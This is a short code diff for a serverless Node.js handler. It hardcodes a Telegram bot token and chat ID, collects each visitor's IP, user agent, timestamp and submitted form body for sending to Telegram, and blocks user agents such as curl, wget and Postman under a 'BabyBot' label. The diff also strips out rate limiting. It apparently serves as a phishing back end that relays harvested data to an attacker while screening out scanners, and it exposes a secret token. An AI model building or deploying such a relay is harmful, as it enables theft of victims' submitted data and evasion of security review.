@@ -1,27 +1,14 @@
 const fetch = require('node-fetch');
 
-// In-memory store for rate limiting (resets on function redeploy)
-const requestCounts = new Map();
-
 exports.handler = async (event) => {
   const telegramBotToken = '7686288445:AAEFKviKwOyJMRRqwI23qNkycvK6u7PZFeY';
-  const telegramChatId = '7646336470';
+  const telegramChatId = '7646336470'; // Your provided Chat ID
   const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
   const ip = event.headers['client-ip'] || 'Unknown';
   const agent = event.headers['user-agent'] || 'Unknown';
   const time = new Date().toISOString();
   const data = JSON.parse(event.body);
-
-  // Rate Limiting: Allow 5 requests per IP per minute
-  const now = Math.floor(Date.now() / 60000); // Minute key
-  const key = `${ip}:${now}`;
-  const count = requestCounts.get(key) || 0;
-  if (count >= 5) {
-    return { statusCode: 429, body: 'Too Many Requests' };
-  }
-  requestCounts.set(key, count + 1);
-  setTimeout(() => requestCounts.delete(key), 60000); // Clear after 1 minute
 
   // BabyBot Logic
   const agentsBlacklist = ['curl', 'wget', 'python-requests', 'node-fetch', 'PostmanRuntime', 'okhttp', 'Apache-HttpClient'];
